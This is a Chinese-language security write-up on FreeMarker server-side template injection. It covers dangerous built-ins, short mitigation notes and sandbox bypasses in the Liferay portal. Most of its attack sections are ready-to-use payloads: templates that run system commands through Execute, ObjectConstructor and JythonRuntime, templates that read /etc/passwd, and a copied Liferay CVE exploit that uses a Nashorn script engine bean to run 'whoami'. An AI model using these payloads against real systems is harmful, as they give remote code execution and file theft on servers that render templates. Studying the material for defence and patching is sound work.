# FreeMarker

FreeMarker 是一款模板引擎，即一种基于模板和需要改变的数据， 并用来生成输出文本( HTML 网页，电子邮件，配置文件，源代码等)的通用工具，其模板语言为 FreeMarker Template Language (FTL）。

## 0x01 简单的demo

```java
// 第一步：创建一个Configuration对象，直接new一个对象。构造方法的参数就是FreeMarker对于的版本号。
Configuration configuration = new Configuration(Configuration.getVersion());
// 第二步：设置模板文件所在的路径。
configuration.setDirectoryForTemplateLoading(new File("/WEB-INF/ftl"));
// 第三步：设置模板文件使用的字符集。一般就是utf-8.
configuration.setDefaultEncoding("utf-8");
// 第四步：加载一个模板，创建一个模板对象。
Template template = configuration.getTemplate("hello.ftl");
// 第五步：创建一个模板使用的数据集，可以是pojo也可以是map。一般是Map。
Map dataModel = new HashMap<>();
//向数据集中添加数据
dataModel.put("hello", "this is my first FreeMarker test.");
// 第六步：创建一个Writer对象，一般创建一FileWriter对象，指定生成的文件名。
Writer out = new FileWriter(new File("/hello.html"));//这里可以用StringBuilder ==> 直接回显
// 第七步：调用模板对象的process方法输出文件。
template.process(dataModel, out);
// 第八步：关闭流。
out.close();
```

## 0x02 标签的基本语法

freemarker中需要特殊处理的三种标签

- `${*...*}`： FreeMarker将会输出真实的值来替换大括号内的表达式，这样的表达式被称为 **interpolation**(在文本区(比如 `Hello ${name}!`) 和字符串表达式(比如 `<#include "/footer/${company}.html">`)中。)
- **FTL 标签** (FreeMarker模板的语言标签)： FTL标签和HTML标签有一些相似之处，但是它们是FreeMarker的指令，是不会在输出中打印的。 这些标签的名字以 `#` 开头。(用户自定义的FTL标签则需要使用 `@` 来代替 `#`，但这属于更高级的话题了。)
- **注释：** 注释和HTML的注释也很相似， 但是它们使用 `<#--` and `-->` 来标识。 不像HTML注释那样，FTL注释不会出现在输出中(不出现在访问者的页面中)， 因为 FreeMarker会跳过它们。

freemarker中的用户标签和自定义标签的区别

- ... 输出(返回值)的是标记(HTML,XML等)。 主要原因是函数的返回结果可以自动进行XML转义(这是因为 `${*...*}` 的特性)， 而用户自定义指令的输出则不是 (这是因为 `<@*...*>` 的特性所致; 它的输出假定是标记，因此已经转义过了)。

```
exec:84, Execute (freemarker.template.utility)
_eval:62, MethodCall (freemarker.core)
eval:101, Expression (freemarker.core)
calculateInterpolatedStringOrMarkup:100, DollarVariable (freemarker.core)
accept:63, DollarVariable (freemarker.core)
visit:347, Environment (freemarker.core)
visit:353, Environment (freemarker.core)
process:326, Environment (freemarker.core)
process:383, Template (freemarker.template)
createHtmlFromString:60, TestController (com.dem0.freemarker.controller)
```

## 0x03 内建函数

> 我们突破的时候经常会使用的内建函数： http://freemarker.foofun.cn/ref_builtins.html 
>
> 除了内建函数之后，应该就是内建对象了。

### `api`

`value?api.someJavaMethod()`。使用大概像这样，可以调用一些java的api，使用起来非常刺激，就会又归结到最后java层面的webshell了，很有趣!

但是这个函数启用需要很多条件。**必须在配置项`api_builtin_enabled`为`true`时才有效，而该配置在`2.3.22`版本之后默认为`false`**。

```java
  <#assign classLoader=object?api.class.protectionDomain.classLoader>
  eg1：
  <#assign classLoader=object?api.class.getClassLoader()>
  ${classLoader.loadClass("our.desired.class")}

  eg2： 任意文件读
  <#assign uri=object?api.class.getResource("/").toURI()>
  <#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
  <#assign is=input?api.getInputStream()>
  FILE:[<#list 0..999999999 as _>
      <#assign byte=is.read()>
      <#if byte == -1>
          <#break>
      </#if>
  ${byte}, </#list>]
eg3: 
   <#assign is=object?api.class.getResourceAsStream("/etc/passwd")>
    FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
    ${byte}, </#list>]
eg4:
<#assign uri=object?api.class.getResource("/").toURI()>
    <#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
    <#assign is=input?api.getInputStream()>
    FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
    ${byte}, </#list>]
eg5:获取classLoader
<#assign classLoader=object?api.class.protectionDomain.classLoader>
    <#assign clazz=classLoader.loadClass("ClassExposingGSON")>
    <#assign field=clazz?api.getField("GSON")>
    <#assign gson=field?api.get(null)>
    <#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))>
    ${ex("calc")}
```

### `new`

这个就是可以新建一个对象`用来创建一个具体实现了`TemplateModel`接口的变量的内建函数`.三个符合条件的函数

```java
<#assign value="freemarker.template.utility.Execute"?new()>
${value("calc.exe")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder","calc.exe").start()}

<#assign value="freemarker.template.utility.JythonRuntime"?new()>
<@value>import os;os.system("calc.exe")</@value>
```

```java
 //freemarker.template.utility.Execute实现了TemplateMethodModel接口(继承自TemplateModel)
 <#assign ex="freemarker.template.utility.Execute"?new()> 
 ${ex("id")}//系统执行id命令并返回
```

但是也依然受到了限制`cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);`,这样就可以ban掉。

![image-20220529102538971](https://c.img.dasctf.com/images/2022529/1653791142606-66883bc3-7df6-47a1-a6ed-e2d0cf4fe9bd.png)

[Configurable.setAPIBuiltinEnabled](https://freemarker.apache.org/docs/api/freemarker/core/Configurable.html#setAPIBuiltinEnabled-boolean)可以通过这个开启。

```java
<#--    回显 -->
    <#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
    <#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.ProcessBuilder","ifconfig").start().getInputStream())) >
    <#list 1..10000 as t>
        <#assign line=br.readLine()!"null">
        <#if line=="null">
            <#break>
        </#if>
        ${line}
        ${"<br>"}
    </#list>

<#--    读文件 -->
    <#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
    <#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.io.FileInputStream","/etc/passwd"))) >
    <#list 1..10000 as t>
        <#assign line=br.readLine()!"null">
        <#if line=="null">
            <#break>
        </#if>
        ${line?html}
        ${"<br>"}
    </#list>
```

常用的一些内置

```java
<#assign optTemp = .get_optional_template('/etc/passwd')><#if optTemp.exists>Template was found:<@optTemp.include /><#else>Template was missing.</#if>
```

include

## 0x04 修复

FreeMarker内置了一份危险方法名单`unsafeMethods.properties`。可以禁用一些方法(api).

```
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER); ban掉new
```

## 0x05  lifeary 摸索

首先是我们把之前的利用，直接一把嗦进去了。

```java
 <#assign ex="freemarker.template.utility.Execute"?new()> 
 ${ex("id")}//系统执行id命令并返回
```

可以看到并没有什么鸟用。

![image-20220520085415336](https://c.img.dasctf.com/images/2022520/1653008064823-db2fdccb-88c7-44b8-ba1f-0e7c4aee3e63.png)

我们迅速定位到lifeary的`LiferayTemplateClassResolver`,这个类是处理类的新建的，可以有效的来看看这个错误到底是什么？

![image-20220520090123858](C:\Users\MSI\AppData\Roaming\Typora\typora-user-images\image-20220520090123858.png)

这两个类是直接ban了。

```
restrictedClassNames = {String[13]@44707} ["com.liferay.por...", "java.lang.Class", "java.lang.Class...", "java.lang.Compi...", "java.lang.Packa...", +8 more]
 0 = "com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist"
 1 = "java.lang.Class"
 2 = "java.lang.ClassLoader"
 3 = "java.lang.Compiler"
 4 = "java.lang.Package"
 5 = "java.lang.Process"
 6 = "java.lang.Runtime"
 7 = "java.lang.RuntimePermission"
 8 = "java.lang.SecurityManager"
 9 = "java.lang.System"
 10 = "java.lang.Thread"
 11 = "java.lang.ThreadGroup"
 12 = "java.lang.ThreadLocal"
```

不能新建这些类了，然后我们继续看，又发现了一个白名单，有狗？默认为空，也不能用了。所以`new`是没得用了。但是有一个新鲜的类。如果有白名单就可以利用了。

```java
  <#assign value="com.liferay.portal.template.freemarker.internal.LiferayObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
```

但是这个很明显是没有什么用的。

```java
@Meta.AD(name = "allowed-classes", required = false)
	public String[] allowedClasses();

	@Meta.AD(
		deflt = "com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist|java.lang.Class|java.lang.ClassLoader|java.lang.Compiler|java.lang.Package|java.lang.Process|java.lang.Runtime|java.lang.RuntimePermission|java.lang.SecurityManager|java.lang.System|java.lang.Thread|java.lang.ThreadGroup|java.lang.ThreadLocal",
		name = "restricted-classes", required = false
	)
	public String[] restrictedClasses();
```

```java
 @Meta.AD(name = "allowed-classes", required = false)
  public String[] allowedClasses();

  @Meta.AD(
      deflt = "com.ibm.*|com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist|com.liferay.portal.spring.context.*|io.undertow.*|java.lang.Class|java.lang.ClassLoader|java.lang.Compiler|java.lang.Package|java.lang.Process|java.lang.Runtime|java.lang.RuntimePermission|java.lang.SecurityManager|java.lang.System|java.lang.Thread|java.lang.ThreadGroup|java.lang.ThreadLocal|org.apache.*|org.glassfish.*|org.jboss.*|org.springframework.*|org.wildfly.*|weblogic.*",
      name = "restricted-classes", required = false
  )
  public String[] restrictedClasses();
```

对比出来的差距有

```
com.ibm.*
com.liferay.portal.spring.context.*
io.undertow.*
org.apache.*
org.glassfish.*
org.jboss.*
org.springframework.*
org.wildfly.*
weblogic.*
```

这些类在最后都会成为我们bypass沙箱的主要支柱。还有一个小的bypass技巧。

![image-20220520101903529](C:\Users\MSI\AppData\Roaming\Typora\typora-user-images\image-20220520101903529.png)



### 内部的对象

```java
result = {HashMap@48419}  size = 147
 "reserved-article-author-job-title" -> {TemplateNode@48531}  size = 6
 "portal" -> {PortalImpl@48241} 
 "commonPermission" -> {CommonPermissionImpl@48268} 
 "portletDisplay" -> {PortletDisplay@48270} 
 "expandoValueLocalService" -> {$Proxy44@48272} 
 "init" -> "/classic-theme_SERVLET_CONTEXT_/templates/init.ftl"
 "plid" -> "2"
 "organizationPermission" -> {OrganizationPermissionImpl@48278} 
 "passwordPolicyPermission" -> {PasswordPolicyPermissionImpl@48280} 
 "expandoColumnLocalService" -> {$Proxy41@48282} 
 "reserved-article-asset-tag-names" -> {TemplateNode@48539}  size = 6
 "renderRequest" -> {RenderRequestImpl@48541} 
 "timeZone" -> {ZoneInfo@48286} "sun.util.calendar.ZoneInfo[id="UTC",offset=0,dstSavings=0,useDaylight=false,transitions=0,lastRule=null]"
 "languageUtil" -> {LanguageImpl@48290} 
 "randomNamespace" -> "rclo_"
 "enumUtil" -> {_EnumModels@48544} 
 "realUser" -> {UserImpl@48300}
 "liferay_aui" -> {TaglibFactory$Taglib@48546} 
 "liferay-fragment" -> {TaglibFactory$Taglib@48548} 
 "unicodeFormatter" -> {UnicodeFormatter_IW@48302} 
 "propsUtil" -> {PropsImpl@48304} 
 "liferay_social_activities" -> {TaglibFactory$Taglib@48550} 
 "portletURLFactory" -> {PortletURLFactoryImpl@48312} 
 "imageToken" -> {WebServerServletTokenImpl@48314} 
 "device" -> {UnknownDevice@48554} 
 "Application" -> {ServletContextHashModel@48556} 
 "timeZoneUtil" -> {TimeZoneUtil_IW@48320} 
 "reserved-article-id" -> {TemplateNode@48558}  size = 6
 "auditRouterUtil" -> {$Proxy252@48328} 
 "accountPermission" -> {AccountPermissionImpl@48330} 
 "layoutTypePortlet" -> {LayoutTypePortletImpl@48332} 
 "reserved-article-url-title" -> {TemplateNode@48560}  size = 6
 "reserved-article-small-image-url" -> {TemplateNode@48562}  size = 6
 "clay" -> {TaglibFactory$Taglib@48564} 
 "rolePermission" -> {RolePermissionImpl@48343} 
 "liferay_product_navigation" -> {TaglibFactory$Taglib@48566} 
 "liferay_site" -> {TaglibFactory$Taglib@48568} 
 "paramUtil" -> {ParamUtil_IW@48347} 
 "bodyCssClass" -> "dialog-iframe-popup dialog-with-footer"
 "locationPermission" -> {OrganizationPermissionImpl@48278} 
 "theme" -> {ThemeImpl@48354} 
 "journalContent" -> {JournalContentImpl@48570} 
 "portlet" -> {TaglibFactory$Taglib@48572} 
 "calendarFactory" -> {CalendarFactoryImpl@48356} 
 "userGroupPermission" -> {UserGroupPermissionImpl@48363} 
 "liferay_journal" -> {TaglibFactory$Taglib@48576} 
 "prefsPropsUtil" -> {PrefsPropsImpl@48367} 
 "xmlRequest" -> {TemplateContextHelper$1@48578} 
 "liferay_portlet" -> {TaglibFactory$Taglib@48580} 
 "liferay_flags" -> {TaglibFactory$Taglib@48582} 
 "liferay_theme" -> {TaglibFactory$Taglib@48584} 
 "liferay_ui" -> {TaglibFactory$Taglib@48586} 
 "liferay_layout" -> {TaglibFactory$Taglib@48552} 
 "urlCodec" -> {URLCodec_IW@48377} 
 "requestMap" -> {HashMap@48588}  size = 28
 "portletModeFactory" -> {PortletModeFactory_IW@48379} 
 "portletRequestModelFactory" -> {PortletRequestModelFactory@48590} 
 "chart" -> {TaglibFactory$Taglib@48592} 
 "colorScheme" -> {ColorSchemeImpl@48388} 
 "liferay_site_navigation" -> {TaglibFactory$Taglib@48594} 
 "themeDisplay" -> {ThemeDisplay@48229} 
 "portalPermission" -> {PortalPermissionImpl@48233} 
 "layoutPermission" -> {LayoutPermissionImpl@48235} 
 "liferay_util" -> {TaglibFactory$Taglib@48596} 
 "expandoTableLocalService" -> {$Proxy43@48237} 
 "journalTemplatesPath" ->
 "localeUtil" -> {LocaleUtil@48239} 
 "groupId" -> {Long@48600} 20119
 "portalUtil" -> {PortalImpl@48241} 
 "validator" -> {Validator_IW@48243} 
 "jsonFactoryUtil" -> {JSONFactoryImpl@48251} 
 "stringUtil" -> {StringUtil_IW@48253} 
 "htmlTitle" -> "Home - Liferay"
 "scopeGroupId" -> {Long@48602} 20119
 "dateFormatFactory" -> {FastDateFormatFactoryImpl@48260} 
 "reserved-article-author-email-address" -> {TemplateNode@48604}  size = 6
 "reserved-article-author-comments" -> {TemplateNode@48606}  size = 6
 "liferay_sharing" -> {TaglibFactory$Taglib@48608} 
 "liferay_asset" -> {TaglibFactory$Taglib@48610} 
 "PortletJspTagLibs" -> {FreeMarkerManager$TaglibFactoryWrapper@48612} 
 "reserved-article-description" -> {TemplateNode@48614}  size = 6
 "reserved-article-title" -> {TemplateNode@48616}  size = 6
 "articleGroupId" -> {Long@48618} 20119
 "htmlUtil" -> {HtmlImpl@48288} 
 "liferay_reading_time" -> {TaglibFactory$Taglib@48620} 
 "permissionChecker" -> {StagingPermissionChecker@48292} 
 "viewMode" -> "view"
 "PortalJspTagLibs" -> {FreeMarkerManager$TaglibFactoryWrapper@48612} 
 "templatesPath" -> "_TEMPLATE_CONTEXT_/20095/20119/34526"
 "windowStateFactory" -> {WindowStateFactory_IW@48298} 
 "companyId" -> {Long@48625} 20095
 "reserved-article-version" -> {TemplateNode@48627}  size = 6
 "browserSniffer" -> {BrowserSnifferImpl@48306} 
 "liferay_security" -> {TaglibFactory$Taglib@48687} 
 "portletProviderAction" -> {HashMap@48688}  size = 6
 "httpUtil" -> {TemplateContextHelper$HttpWrapper@48689} 
 "reserved-article-author-name" -> {TemplateNode@48691}  size = 6
 "groupPermission" -> {GroupPermissionImpl@48316} 
 "fullCssPath" -> "/classic-theme_SERVLET_CONTEXT_/css"
 "reserved-article-author-id" -> {TemplateNode@48694}  size = 6
 "unicodeLanguageUtil" -> {UnicodeLanguageImpl@48322} 
 "request" -> {ProtectedServletRequest@48324} 
 "liferay_comment" -> {TaglibFactory$Taglib@48696} 
 "expandoRowLocalService" -> {$Proxy42@48326} 
 "liferay_editor" -> {TaglibFactory$Taglib@48698} 
 "fullTemplatesPath" -> "/classic-theme_SERVLET_CONTEXT_/templates"
 "navItems" -> {ArrayList@48700}  size = 1
 "locale" -> {Locale@44689} "zh_CN"
 "reserved-article-display-date" -> {TemplateNode@48702}  size = 6
 "content" -> {TemplateNode@48704}  size = 6
 "random" -> {Random@48705} 
 "portletPermission" -> {PortletPermissionImpl@48345} 
 "renderResponse" -> {RenderResponseImpl@48707} 
 "liferay_map" -> {TaglibFactory$Taglib@48709} 
 "liferay_item_selector" -> {TaglibFactory$Taglib@48711} 
 "siteGroupId" -> {Long@48713} 20119
 "liferay_rss" -> {TaglibFactory$Taglib@48715} 
 "company" -> {CompanyImpl@48352}
 "reserved-article-create-date" -> {TemplateNode@48717}  size = 6
 "adaptive_media_image" -> {TaglibFactory$Taglib@48719} 
 "liferay_expando" -> {TaglibFactory$Taglib@48721} 
 "liferay_frontend" -> {TaglibFactory$Taglib@48723} 
 "webServerToken" -> {WebServerServletTokenImpl@48314} 
 "liferay_document_library" -> {TaglibFactory$Taglib@48725} 
 "sessionClicks" -> {SessionClicks_IW@48359} 
 "userPermission" -> {UserPermissionImpl@48361} 
 "Request" -> {HttpRequestHashModel@48727} 
 "arrayUtil" -> {ArrayUtil_IW@48365} 
 "liferay_trash" -> {TaglibFactory$Taglib@48729} 
 "portletGroupId" -> {Long@48730} 20119
 "journalContentUtil" -> {JournalContentImpl@48570} 
 "layout" -> {LayoutImpl@48371} 
 "liferay_social_bookmarks" -> {TaglibFactory$Taglib@48733} 
 "portletConfig" -> {PortletConfigImpl@48735} 
 "imageToolUtil" -> {ImageToolImpl@48381} 
 "writer" -> {UnsyncStringWriter@48417} ""
 "auditMessageFactoryUtil" -> {AuditMessageFactoryImpl@48383} 
 "user" -> {UserImpl@48300} 
 "taglibLiferayHash" -> {FreeMarkerManager$TaglibFactoryWrapper@48612} 
```

### jsonFactoryUtil

可以进行json的反序列化操作的一个datamodel。这个类的两个方法就是`serialize`和`deserialize`方法。我们其中重点关注`deserialize`方法。

![image-20220526160242269](https://c.img.dasctf.com/images/2022526/1653552171711-0604fd3a-72bd-429f-8221-2ad4b253eddd.png)

`LiferayJSONSerializer`父类的`fromJSON`方法，发现其中又调用了`unmarshall`方法。在`unmarshall`方法中会调用`getClassFromHint`方法，不过该方法在子类被重写了。我们现在还有可以利用的就是**如果通过白名单校验，就会通过`contextName`字段的值去指定`ClassLoader`用于加载`javaClass`字段指定的类。**最后在方法末尾会执行`super.getClassFromHint(object)`，回调父类的`getClassFromHint`的方法。

这是JSON反序列化的白名单类

```java
json.deserialization.whitelist.class.names=\
    com.liferay.portal.kernel.cal.DayAndPosition,\
    com.liferay.portal.kernel.cal.Duration,\
    com.liferay.portal.kernel.cal.TZSRecurrence,\
    com.liferay.portal.kernel.messaging.Message,\
    com.liferay.portal.kernel.model.PortletPreferencesIds,\
    com.liferay.portal.kernel.security.auth.HttpPrincipal,\
    com.liferay.portal.kernel.service.permission.ModelPermissions,\
    com.liferay.portal.kernel.service.ServiceContext,\
    com.liferay.portal.kernel.util.GroupSubscriptionCheckSubscriptionSender,\
    com.liferay.portal.kernel.util.LongWrapper,\
    com.liferay.portal.kernel.util.SubscriptionSender,\
    java.util.GregorianCalendar,\
    java.util.Locale,\
    java.util.TimeZone,\
    sun.util.calendar.ZoneInfo
```

很明显到这里好像没有什么新思路了，我们继续探索。

### renderRequest

然后我们抄一个exp。这就是那个CVE的exp。

```java
<#assign sp=renderRequest.getPortletContext().getServletContext().getContext("/").getAttribute("org.springframework.web.context.WebApplicationContext.ROOT").getBeanFactory().getBeanDefinition("com.liferay.document.library.kernel.service.DLAppService")>
<#assign ec=sp.setScope("prototype")>
<#assign eb=sp.setBeanClassName("jdk.nashorn.api.scripting.NashornScriptEngineFactory")>
<#assign xx=renderRequest.getPortletContext().getServletContext().getContext("/").getAttribute("org.springframework.web.context.WebApplicationContext.ROOT").getBeanFactory().registerBeanDefinition("sp",sp)>
<#assign res=renderRequest.getPortletContext().getServletContext().getContext("/").getAttribute("org.springframework.web.context.WebApplicationContext.ROOT").getBeanFactory().getBean("sp").getScriptEngine().eval("var a = new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','whoami']);var b=a.start().getInputStream();var c=Java.type('com.liferay.portal.kernel.util.StreamUtil');var d=new java.io.ByteArrayOutputStream();c.transfer(b,d,1024,false);var e=new java.lang.String(d.toByteArray());e")>
${res}

${themeDisplayModel.getPortletDisplayModel().getAttributes().getPortletRequest().getContextPath()}
```

这里的exp的思路就是`renderRequest.getPortletContext().getServletContext().getContext("/")`通过这一串获取到springboot的ApplicationContext。然后通过ApplicationContext获取PortalApplicationContext，然后获取`LiferayBeanFactory`.最后用`jdk.nashorn.api.scripting.NashornScriptEngineFactory`，通过 NashornScriptEngine 调用 eval 执行恶意脚本，触发远程代码执行

我们也探索出了SSTI中问题的普遍解法，就是找上下文+内建函数。

### saxReaderUtil(xml获取)

```
saxReaderUtil.readURL("http://ip", false)
```

发现这样确实，会收到http请求。猜测一下是不是xml解析。

报错

![image-20220520204439813](https://c.img.dasctf.com/images/2022520/1653050689561-7475f37f-36be-4304-9bb3-34408894afc5.png)

### Application

![image-20220521001314802](https://c.img.dasctf.com/images/2022520/1653063204473-154b8c4b-3757-44aa-b918-4427b73b2504.png)

这个类大有作为！

```
this._attributes.get("CTX").getContext("/").getAttribute("org.springframework.web.context.WebApplicationContext.ROOT")
themeDisplayModel.getPortletDisplayModel().getAttributes().get("CTX").getContext("/").getAttribute("org.springframework.web.context.WebApplicationContext.ROOT")
```

```java
<#assign sp=Application["org.springframework.web.context.WebApplicationContext.ROOT"].getBeanFactory().getBeanDefinition("com.liferay.document.library.kernel.service.DLAppService")>
<#assign ec=sp.setScope("prototype")>
<#assign eb=sp.setBeanClassName("jdk.nashorn.api.scripting.NashornScriptEngineFactory")>
<#assign xx=Application["org.springframework.web.context.WebApplicationContext.ROOT"].getBeanFactory().registerBeanDefinition("sp",sp)>
<#assign res=Application["org.springframework.web.context.WebApplicationContext.ROOT"].getBeanFactory().getBean("sp").getScriptEngine().eval("var a = new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','whoami']);var b=a.start().getInputStream();var c=Java.type('com.liferay.portal.kernel.util.StreamUtil');var d=new java.io.ByteArrayOutputStream();c.transfer(b,d,1024,false);var e=new java.lang.String(d.toByteArray());e")>
${res}
```

获取request和reponse的对象后面，然后利用springoot的beanfactory来调用`NashornScriptEngineFactory`。但是通过黑名单的查看，我们可以发现在进行过那一次大的版本更新之后，黑名单暂时没有增加新的包，暂时如果要在这个框架上面取得突破，必须采取的方法就是最后的部分bypass。这里 主要是寻找到的内建变量来获取这些可以操作的东西。实例化JDK中的 `Nashorn` 脚本引擎工厂，接着调用 `getScriptEngine` 获取 `Nashorn` 引擎实例，再调用 `eval` 方法来执行脚本。

### TaglibFactory

> 给模板文件添加内部变量

### propsUtil

可以获取到配置内容，暂时还不知道怎么扩大伤害。

### xmlrequest

![image-20220523154951015](https://c.img.dasctf.com/images/2022523/1653292200154-bd6f1308-696c-4890-a6e5-86ea4634e0a5.png)

### end

这是在经过了挖掘这些内部对象的利用之后，总结出来的一些可以利用上诉CVE的内置对象，大家可以再深入的学习一下写出自己的exp。其中的`imageToolUtil`,是可以和Convert进行配合使用来达到RCE的目的，详情可以参照之前的春秋game的`picture convert`。

```java
 "renderRequest" -> {RenderRequestImpl@48541} 
 "Application" -> {ServletContextHashModel@48556} 
 "Request" -> {HttpRequestHashModel@48727} 
 "xmlRequest" -> {TemplateContextHelper$1@48578} 
 "company" -> {CompanyImpl@48352}  
this.context.get("portletRequestModelFactory").getPortletRequestModel().getPortletRequest()
     ===> com.liferay.portlet.internal.RenderRequestImpl@2f03771c  ${portletRequestModelFactory.getPortletRequestModel().getPortletRequest()} 
"jsonFactoryUtil" -> {JSONFactoryImpl@48251} 
this.context.get("request").getRequest() == > ${request.getRequest()}
portletConfig.getPortletContext().getServletContext()
"imageToolUtil" -> {ImageToolImpl@48381}  ==> 触发convert
```

## 0x06 环境搭建

在进行debug环境部署的时候，我碰到了很多的坎坷，在这里给大家分享一下搭建环境的妙招，可以自己接下来进行debug。我使用的环境是`IDEA`.

- 首先安装lifeary插件

- 新建项目，随便选择，我自己更喜欢的是Maven，但是Gradle可以使用docker进行debug，也很方便。

  ![image-20220529101339288](https://c.img.dasctf.com/images/2022529/1653790428284-6ac6db85-b11c-4ad4-86b2-6d863b6ca546.png)

- 进来之后，讲从官网下载的src目录，加入到lib，可以方便debug源码。

  ![image-20220529101527647](https://c.img.dasctf.com/images/2022529/1653790529157-c97593d8-d15e-464e-9614-a7d629f75453.png)

- 导入之后，初始化本地环境，右键就可以看到。(记得新建的时候选择好自己的版本)

  ![image-20220529101612719](https://c.img.dasctf.com/images/2022529/1653790573595-b10f7ad9-8089-4b37-90e7-859630e92ce7.png)

  - 最后就可以安心的开发portal和debug源码了。

    ![image-20220529101831757](https://c.img.dasctf.com/images/2022529/1653790712743-17f490c4-e43e-4856-9080-58caecc84ca3.png)

  - 开发模块，直接新建module，开发完成之后，maven==>deploy即可。

    ![image-20220529101804141](https://c.img.dasctf.com/images/2022529/1653790688754-dec48a43-e380-48a3-8390-4e847a994b38.png)

## 0x07 参考资料

> 参考链接： https://xz.aliyun.com/t/4846#toc-2
>
> https://www.anquanke.com/post/id/215348
>
> https://www.freebuf.com/articles/web/287319.html
>
> 官方文档：
>
> https://freemarker.apache.org/docs/index.html
>
> 中文：http://freemarker.foofun.cn/toc.html
>
> https://forum.butian.net/share/42
